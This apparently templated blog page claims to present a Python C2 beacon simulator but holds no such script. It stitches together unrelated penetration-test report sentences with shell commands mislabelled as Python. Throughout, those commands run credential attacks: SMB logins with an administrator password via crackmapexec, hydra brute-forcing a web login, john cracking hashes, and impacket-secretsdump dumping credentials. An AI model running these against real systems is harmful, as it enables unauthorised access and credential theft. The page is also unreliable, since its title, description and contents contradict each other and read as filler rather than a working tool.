---
TitleSEO: "C2 Beacon Simulator in Python | ZureFX"
TitlePost: "C2 Beacon Simulator — Python"
Author: "ZureFX"
Description: "A Python script for c2 beacon simulator. Built for security research and automation."
Keywords: "scanner, automation, c, tool, parser, python"
URL: "https://zurefx.github.io/scripting/script-c2-beacon-simulator-390.html"
URL_IMAGES: ""
Date: "2025-12-09"
Tags: "Scanner, Automation, C, Tool, Parser, Python"
Section: "scripting"
Lang: "en"
main_img: "script-c2-beacon-simulator-390"
Permalink: "/scripting/script-c2-beacon-simulator-390.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `burpsuite`
- `ldapsearch`
- `msfvenom`

## Implementation

### Core Logic

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

```python
crackmapexec smb 10.71.16.241 -u administrator -p 'P@ssw0rd!' --shares
```

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

### Helper Functions

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

```python
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.53.126.183 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.104.154.163 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.100.55.174
```

### Advanced Options

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code.

```bash
crackmapexec smb 10.42.45.224 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.83.41.130 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 20 results
[+] Done in 15.34s
```
